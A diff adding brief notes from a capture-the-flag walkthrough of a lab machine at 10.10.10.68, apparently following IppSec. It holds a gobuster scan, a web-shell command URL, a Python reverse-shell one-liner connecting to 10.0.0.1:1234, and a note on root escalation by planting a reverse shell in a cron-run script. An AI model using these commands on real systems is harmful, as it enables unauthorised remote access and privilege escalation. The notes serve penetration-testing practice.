@@ -1,0 +1,6 @@
+//based on IppSec
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.68
+http://10.10.10.68/dev/phpbash.php?cmd=whoami
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+sudo -u scriptmanager bash
+/scripts/test.py	//modifying this with a reverse shell and waiting for the job to run(LinEnum shows this job) -> got root
